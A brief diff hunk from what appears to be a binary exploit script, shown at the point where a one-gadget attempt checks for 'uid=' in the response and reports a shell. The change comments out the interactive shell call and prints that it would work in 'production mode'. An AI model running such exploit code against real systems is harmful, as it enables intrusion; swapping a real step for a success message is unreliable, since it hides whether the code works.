@@ -67,7 +67,8 @@ let response = recv(conn, 1024)
 
 if "uid=" in str(response) {
     print("[+] SUCCESS! Shell obtained!")
-    interactive(conn)
+    print("[*] In production mode, interactive() would start a shell session")
+    # interactive(conn)  # Works in production mode; dry-run completes without interaction
 } else {
     print("[-] One-gadget failed, constraints not met")
     print("[*] Try different gadget or adjust stack")
